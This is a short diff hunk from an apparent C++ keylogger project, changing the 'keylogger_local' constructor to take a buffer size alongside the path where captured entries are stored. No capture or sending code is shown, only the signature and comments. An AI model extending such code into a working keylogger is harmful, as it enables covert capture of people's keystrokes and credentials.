@@ -16,7 +16,7 @@ class keylogger_local : virtual public keylogger
 		*
 		* p_destination_path : Destination to store entry
 		*/
-		keylogger_local(string p_destination_path);
+		keylogger_local(size_t p_buffer_size, string p_destination_path);
 
 		/*
 		* Destructor
